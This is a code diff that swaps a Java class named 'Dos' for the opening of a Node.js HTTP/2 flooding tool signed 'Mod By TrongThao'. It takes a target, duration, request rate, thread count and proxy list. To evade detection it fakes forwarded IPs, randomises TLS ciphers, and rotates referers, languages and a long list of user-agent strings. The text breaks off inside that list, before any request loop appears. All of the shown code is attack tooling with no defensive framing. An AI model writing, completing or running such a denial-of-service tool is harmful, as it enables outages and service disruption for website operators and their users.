@@ -1,200 +1,654 @@
-import java.io.*;
-import java.net.*;
-import java.util.Scanner;
-import java.util.ArrayList;
+ const net = require("net");
+ const http2 = require("http2");
+ const tls = require("tls");
+ const cluster = require("cluster");
+ const url = require("url");
+ const crypto = require("crypto");
+ const fakeua = require('fake-useragent');
+ const fs = require("fs");
 
-import javax.net.ssl.HttpsURLConnection;
+ process.setMaxListeners(0);
+ require("events").EventEmitter.defaultMaxListeners = 0;
+ process.on('uncaughtException', function (exception) {
+  });
 
+ if (process.argv.length < 7){console.log(`Mod By TrongThao`); process.exit();}
+ const headers = {};
+  function readLines(filePath) {
+     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+ }
+ 
+ function randomIntn(min, max) {
+     return Math.floor(Math.random() * (max - min) + min);
+ }
+ 
+ function randomElement(elements) {
+     return elements[randomIntn(0, elements.length)];
+ } 
+ 
+ function randstr(length) {
+   const characters =
+     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+   let result = "";
+   const charactersLength = characters.length;
+   for (let i = 0; i < length; i++) {
+     result += characters.charAt(Math.floor(Math.random() * charactersLength));
+   }
+   return result;
+ }
+ 
+ const ip_spoof = () => {
+   const getRandomByte = () => {
+     return Math.floor(Math.random() * 255);
+   };
+   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
+ };
+ 
+ const spoofed = ip_spoof();
 
-public class Dos implements Runnable {
+ const ip_spoof2 = () => {
+   const getRandomByte = () => {
+     return Math.floor(Math.random() * 9999);
+   };
+   return `${getRandomByte()}`;
+ };
+ 
+ const spoofed2 = ip_spoof2();
 
+ const ip_spoof1 = () => {
+   const getRandomByte = () => {
+     return Math.floor(Math.random() * 50000);
+   };
+   return `${getRandomByte()}`;
+ };
+ 
+ const spoofed1 = ip_spoof1();
+ 
+ const args = {
+     target: process.argv[2],
+     time: parseInt(process.argv[3]),
+     Rate: parseInt(process.argv[4]),
+     threads: parseInt(process.argv[5]),
+     proxyFile: process.argv[6]
+ }
+ const sig = [    
+    'ecdsa_secp256r1_sha256',
+    'ecdsa_secp384r1_sha384',
+    'ecdsa_secp521r1_sha512',
+    'rsa_pss_rsae_sha256',
+    'rsa_pss_rsae_sha384',
+    'rsa_pss_rsae_sha512',
+    'rsa_pkcs1_sha256',
+    'rsa_pkcs1_sha384',
+    'rsa_pkcs1_sha512'
+ ];
+ const sigalgs1 = sig.join(':');
+ const cplist = [
+    "ECDHE-ECDSA-AES128-GCM-SHA256", 
+    "ECDHE-ECDSA-CHACHA20-POLY1305", 
+    "ECDHE-RSA-AES128-GCM-SHA256", 
+    "ECDHE-RSA-CHACHA20-POLY1305", 
+    "ECDHE-ECDSA-AES256-GCM-SHA384", 
+    "ECDHE-RSA-AES256-GCM-SHA384"
+ ];
+ const accept_header = [
+    '*/*',
+    'image/*',
+    'image/webp,image/apng',
+    'text/html',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+ ]; 
 
+ lang_header = [
+  'ko-KR',
+  'en-US',
+  'zh-CN',
+  'zh-TW',
+  'ja-JP',
+  'en-GB',
+  'en-AU',
+  'en-GB,en-US;q=0.9,en;q=0.8',
+  'en-GB,en;q=0.5',
+  'en-CA',
+  'en-UK, en, de;q=0.5',
+  'en-NZ',
+  'en-GB,en;q=0.6',
+  'en-ZA',
+  'en-IN',
+  'en-PH',
+  'en-SG',
+  'en-HK',
+  'en-GB,en;q=0.8',
+  'en-GB,en;q=0.9',
+  ' en-GB,en;q=0.7',
+ ];
+ 
+ const encoding_header = [
+  'gzip, deflate, br',
+  'deflate',
+  'gzip, deflate, lzma, sdch',
+  'deflate'
+ ];
+ 
+ const control_header = ["no-cache", "max-age=0"];
+ 
+ const refers = [
+     "https://www.google.com/",
+     "https://www.facebook.com/",
+     "https://www.twitter.com/",
+     "https://www.youtube.com/",
+     "https://www.linkedin.com/",
+     "https://proxyscrape.com/",
+     "https://www.instagram.com/",
+     "https://wwww.reddit.com/",
+     "https://fivem.net/",
+     "https://www.fbi.gov/",
+     "https://nettruyenplus.com/",
+     "https://vnexpress.net/",
+     "https://zalo.me",
+     "https://shopee.vn",
+     "https://www.tiktok.com/",
+     "https://google.com.vn/",
+     "https://tuoitre.vn/",
+     "https://thanhnien.vn/",
+     "https://nettruyento.com/"
+ ];
+ const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+ const ciphers1 = "GREASE:" + [
+     defaultCiphers[2],
+     defaultCiphers[1],
+     defaultCiphers[0],
+     ...defaultCiphers.slice(3)
+ ].join(":");
+ 
+ const uap = [
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
+"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
+"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
+"Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
+"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
+"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
+"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)",
+"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)",
+"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
+"Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)",
+"Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
+"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
+"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
+"Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)",
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)",
+"More Internet Explorer 7.0 user agents strings -->>",
+"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
+"Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible;  ;  ; Trident/4.0)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)",
+"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
+" Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
+" Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)",
+" Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
+"Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
+"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
+"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)",
+"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+"Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+"Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)",
+"Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)",
+"Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
+"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
+"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
+"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
+"Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
+"Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
+"Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
+"Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
+"More Internet Explorer 6.0 user agents strings -->>",
+"Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
+"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
+"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
+"Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
+"Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
+"Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
+"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
+"Mozilla/4.0 (compatible; MSIE 5.5;)",
+"Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
+"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
+"More Internet Explorer 5.5 user agents strings -->>",
+"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
+" Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
+"Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
+" Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
+" Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
+" Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
+"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
+"Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
+"More Internet Explorer 5.01 user agents strings -->>",
+"Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
+"Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
+"Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
+"More Internet Explorer 5.0 user agents strings -->>",
+"Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
+"Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
+"Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
+" Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
+"Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
+"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
+"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.133 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.1020.4 Safari/537.36 Edg/95.0.1020.4",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.65 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1587.88 Safari/537.36 Edg/110.0.1587.88",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.68 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.1293.81 Safari/537.36 Edg/104.0.1293.81",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.179 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.1020.93 Safari/537.36 Edg/95.0.1020.93",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.69 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.992.28 Safari/537.36 Edg/94.0.992.28",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.237 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.818.41 Safari/537.36 Edg/90.0.818.41",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.25 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1370.83 Safari/537.36 Edg/106.0.1370.83",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.200 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1370.32 Safari/537.36 Edg/106.0.1370.32",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.34 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1370.87 Safari/537.36 Edg/106.0.1370.87",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.1 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1146.60 Safari/537.36 Edg/99.0.1146.60",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.195 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1587.24 Safari/537.36 Edg/110.0.1587.24",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.137 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1343.29 Safari/537.36 Edg/105.0.1343.29",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.23 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.4 Safari/537.36 Edg/91.0.864.4",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.55 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.1072.83 Safari/537.36 Edg/97.0.1072.83",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.249 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.705.66 Safari/537.36 Edg/88.0.705.66",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.173 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1518.50 Safari/537.36 Edg/109.0.1518.50",
+"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 YaApp_Android/9.00 YaSearchBrowser/9.00",
+"Mozilla/5.0 (Linux; Android 9; LM-Q610.FG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_A007 Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
+"Go-http-client/1.1",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
